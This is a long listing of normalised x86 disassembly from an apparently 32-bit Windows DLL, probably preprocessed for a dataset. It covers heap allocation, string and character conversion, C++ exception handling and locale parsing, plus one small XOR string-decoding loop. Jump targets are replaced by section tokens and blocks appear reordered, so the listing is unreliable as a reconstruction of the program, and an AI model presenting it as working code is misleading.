add esp 0xc
jmp r-xdata
sub_10016320
push ebp
mov ebp esp
push 0xffffffff
push sub_1008667f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x30 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002d4a0
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_100164c3
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_1007fa40
pop ecx
inc eax
jmp r-xdata
sub_10016570
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov eax ebx
push edi
mov [ ebp - 0x8 ] esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea edi [ eax + 0x1 ]
mov [ ebp - 0x10 ] edi
cmp edi esi
jbe r-xdata
inc esi
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1002b2d3
add esp 0x4
mov ebx eax
mov edi ebx
mov [ ebp - 0xc ] 0x0
test esi esi
je r-xdata
lea esp [ esp ]
xor ecx ecx
mov [ edi ] cx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
lea esp [ esp ]
add ebx eax
inc esi
sub edi eax
jne r-xdata
add [ ebp + 0x8 ] eax
add edi 0x2
dec esi
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push edi
lea edx [ ebp - 0x4 ]
push ebx
push edx
call sub_10025a12
add esp 0x14
test eax eax
jle r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
push ecx
push edx
push eax
push edi
call sub_10025a12
add esp 0x14
test eax eax
jle r-xdata
sub_10016630
push ebp
mov ebp esp
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax edi
pop ebp
retn 0x4
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edi ] ecx
mov eax [ eax + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax esi
call sub_10054bf0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_1001668a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_100609b0
mov [ edi ] ax
inc esi
add edi 0x2
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_100166c0
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff96
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xe
jb r-xdata
lea ecx [ ebx + 0x138 ]
xor eax eax
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x8 ] ax
call sub_1004c660
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0xa6
call sub_1002f620
sub_10016734
mov edi edi
push ebp
mov ebp esp
push ecx
mov cx [ ebp + 0x8 ]
movzx eax cx
mov edx 0xffff
mov [ ebp - 0x4 ] eax
cmp cx dx
je r-xdata
leave
retn
mov edx [ ebp + 0xc ]
mov edx [ edx ]
test edx edx
jne r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push edx
call sub_10030f03
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push esi
mov esi 0x100
cmp cx si
pop esi
jae r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ecx - 0x61 ]
cmp dx 0x19
ja r-xdata
sub cx 0x20
movzx eax cx
leave
retn
sub_100167a0
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0xffff
pop ebp
retn 0x4
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov dx [ ebp + 0x8 ]
push esi
mov esi 0xffff
cmp si dx
pop esi
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
add [ eax ] 0xfffffffe
mov eax 0xffff
cmp ax dx
je r-xdata
cmp dx [ eax - 0x2 ]
je r-xdata
xor eax eax
pop ebp
retn 0x4
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
mov [ eax ] dx
movzx eax dx
pop ebp
retn 0x4
test [ ecx + 0x40 ] 0x2
jne r-xdata
sub_10016802
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1001688c
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100650d7
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_100168c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
call sub_10005aeb
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] edx
call sub_100575c5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10016920
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edx
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
call sub_10057700
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10003660
test eax eax
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x2
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov esp ebp
pop ebp
retn 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001699c
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_10025a12
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_1007fa40
pop ecx
inc eax
sub_10016a0d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002d269
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_10081ce3
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1006dd84
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10016af3
push 0x194
mov eax sub_10085d2e
call sub_10047689
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10010f30
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1002f6be
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_1002be90
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10054a5a
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1000a259
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10069470
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10069470
mov eax [ ebp - 0x188 ]
call sub_100262c3
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1005d0f3
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_1002be90
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100332a0
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_10032181
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_100212b7
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_1002f75b
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_10032181
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10026407
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_100255aa
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_1002f75b
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10054a5a
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10069470
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10069470
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1000eff4
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_1001fc54
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1000eff4
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_1002f75b
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_1005664f
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_1001fc54
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10069470
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10005b50
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_100255aa
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10069470
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1002f56c
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
add edi 0x2
call sub_1000eff4
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10069470
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1002f56c
mov ecx esi
call sub_1000eff4
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_1002f75b
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10069470
test edi edi
je r-xdata
mov ecx esi
call sub_1000eff4
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_1001fc54
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_1005664f
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10069470
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10005b50
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
mov ecx [ ebp - 0x174 ]
